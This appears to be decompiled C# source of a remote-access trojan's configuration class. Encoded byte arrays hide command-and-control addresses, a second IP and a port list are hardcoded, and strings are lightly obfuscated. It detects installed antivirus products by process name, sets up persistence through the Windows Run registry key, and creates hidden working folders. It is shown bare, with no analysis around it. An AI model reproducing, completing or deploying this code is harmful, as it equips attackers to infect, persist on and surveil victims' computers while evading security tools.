using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace rmtadrm;

internal static class wrmstimzCONF
{
	public static byte[] wrmstimzvpsips = new byte[33]
	{
		49, 55, 51, 46, 50, 52, 57, 46, 50, 49,
		46, 50, 48, 54, 63, 117, 114, 111, 110, 108,
		105, 110, 101, 115, 116, 111, 114, 101, 115, 46,
		110, 101, 116
	};

	public static string wrmstimzappPath = "\\Ranird\\|wrmstimz".Split(new char[1] { '|' })[0];

	public static byte[] encAvs = new byte[221]
	{
		98, 100, 115, 115, 61, 66, 105, 116, 32, 68,
		101, 102, 101, 110, 100, 101, 114, 44, 111, 110,
		108, 105, 110, 101, 110, 116, 61, 81, 46, 72,
		101, 97, 108, 44, 98, 100, 97, 103, 101, 110,
		116, 61, 66, 105, 116, 32, 68, 101, 102, 101,
		110, 100, 101, 114, 32, 65, 103, 101, 110, 116,
		44, 109, 115, 115, 101, 99, 101, 115, 61, 77,
		83, 32, 69, 115, 115, 101, 110, 116, 105, 97,
		108, 115, 44, 102, 115, 115, 109, 51, 50, 61,
		70, 83, 101, 99, 117, 114, 101, 44, 97, 118,
		112, 61, 75, 97, 115, 112, 101, 114, 115, 107,
		121, 44, 97, 118, 103, 110, 116, 61, 65, 118,
		105, 114, 97, 44, 115, 112, 98, 98, 99, 115,
		118, 99, 61, 83, 121, 109, 97, 110, 116, 101,
		99, 44, 117, 112, 100, 97, 116, 101, 114, 117,
		105, 61, 77, 99, 65, 102, 101, 101, 44, 97,
		118, 103, 117, 105, 61, 65, 86, 71, 44, 97,
		118, 103, 99, 99, 61, 65, 86, 71, 44, 109,
		98, 97, 109, 61, 65, 110, 116, 32, 77, 97,
		108, 119, 97, 114, 101, 44, 97, 118, 97, 115,
		116, 117, 105, 61, 65, 118, 97, 115, 116, 44,
		97, 118, 97, 115, 116, 61, 65, 118, 97, 115,
		116
	};

	public static string wrmstimzdefaultP = "101.250.211.101|wrmstimz".Split(new char[1] { '|' })[0];

	public static string wrmstimzmainApp = "rmtadrm|wrmstimz".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 4565, 7719, 11656, 12895, 14869 };

	public static int wrmstimzport;

	public static string wrmstimzpc_id = "glom|wrmstimz".Split(new char[1] { '|' })[0];

	public static string wrmstimzremvUser = "mudmnc|wrmstimz".Split(new char[1] { '|' })[0];

	public static string wrmstimzfilesLogs = "rnwd".Split(new char[1] { '|' })[0];

	public static string wrmstimzAppPath = "";

	public static string wrmstimzloadAV()
	{
		string text = "";
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] array = Encoding.UTF8.GetString(encAvs, 0, encAvs.Length).Split(new char[1] { ',' });
			for (int i = 0; i < processes.Length; i++)
			{
				string value = processes[i].ProcessName.ToLower();
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].Contains(value))
					{
						string[] array2 = array[j].Split(new char[1] { '=' });
						text = text + " " + array2[1].Trim();
					}
				}
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public static string wrmstimzget_mpath()
	{
		if (wrmstimzAppPath != "")
		{
			return wrmstimzAppPath;
		}
		wrmstimzAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + wrmstimzappPath;
		try
		{
			if (!Directory.Exists(wrmstimzAppPath))
			{
				Directory.CreateDirectory(wrmstimzAppPath);
			}
			if (Directory.Exists(wrmstimzAppPath))
			{
				return wrmstimzAppPath;
			}
		}
		catch
		{
		}
		wrmstimzAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + wrmstimzappPath;
		try
		{
			if (!Directory.Exists(wrmstimzAppPath))
			{
				Directory.CreateDirectory(wrmstimzAppPath);
			}
			if (!Directory.Exists(wrmstimzAppPath))
			{
				return wrmstimzAppPath;
			}
		}
		catch
		{
		}
		wrmstimzAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + wrmstimzappPath;
		try
		{
			if (!Directory.Exists(wrmstimzAppPath))
			{
				Directory.CreateDirectory(wrmstimzAppPath);
			}
			if (!Directory.Exists(wrmstimzAppPath))
			{
				return wrmstimzAppPath;
			}
		}
		catch
		{
		}
		wrmstimzAppPath = Application.get_ExecutablePath();
		return wrmstimzAppPath;
	}

	public static string wrmstimzOsname()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!wrmstimz".Split(new char[1] { '!' })[0]);
			if (registryKey != null)
			{
				string text = registryKey.GetValue("ProductName!wrmstimz".Split(new char[1] { '!' })[0])!.ToString()!.Trim();
				if (text != null)
				{
					return text;
				}
			}
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!wrmstimz".Split(new char[1] { '!' })[0];
		}
	}

	public static void wrmstimzset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|wrmstimz".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = wrmstimzpc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}
}
